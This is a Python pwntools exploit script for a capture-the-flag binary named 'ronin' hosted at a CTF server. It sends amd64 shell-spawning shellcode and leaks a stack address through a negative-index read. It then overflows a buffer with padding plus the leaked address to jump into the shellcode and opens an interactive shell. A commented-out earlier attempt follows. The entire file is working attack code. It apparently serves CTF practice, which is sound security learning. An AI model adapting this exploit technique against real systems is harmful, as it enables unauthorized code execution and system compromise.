#!/usr/bin/env python3

from pwn import *

exe = ELF("./ronin")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                b *encounter+79
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13372)

    return r


def main():
    r = conn()

    shellcode = asm(shellcraft.amd64.linux.sh())
    log.info(f"{len(shellcode)}")

    r.sendline(b'Chase after it.' + shellcode)
    blah = r.recvuntil(b'Which way will you look? ')
    log.info(blah)
    r.sendline(b'-4')
    by = int.from_bytes(r.recvn(6, timeout=10), 'little')
    log.info(f"{by=:02x}")

    r.sendline(b'2')
    r.sendline(b'A'*40 + p64(by - 65))

    # shellcode = asm(shellcraft.amd64.linux.sh())
    # log.info(f"{len(shellcode)}")

    # r.sendline(b'Chase after it.' + shellcode)

    # r.recvuntil(b'Which way will you look?')
    # r.sendline(b'-4')
    # r.recv(1)
    # b = r.recv(timeout=300)
    # num = int.from_bytes(b, 'little')
    # log.info(f"{num=:02x}")

    # offset = 65

    # r.sendline(b'2')
    # r.sendline(b'A'*40 + p64(num - offset))

    r.interactive()


if __name__ == "__main__":
    main()
